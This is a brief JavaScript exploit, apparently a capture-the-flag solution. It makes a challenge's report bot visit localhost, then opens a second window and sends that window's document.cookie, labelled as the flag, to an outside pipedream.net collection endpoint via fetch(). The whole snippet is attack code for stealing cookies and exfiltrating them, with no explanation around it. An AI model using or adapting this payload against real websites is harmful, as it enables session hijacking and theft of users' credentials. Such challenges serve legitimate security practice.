const win = window.open('http://web.h4ckingga.me:10022/report?url=http://localhost');
setTimeout(() => {
    const win2 = window.open('/');
    fetch(`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/?flag=`.concat(win2.document.cookie));
}, 1000);
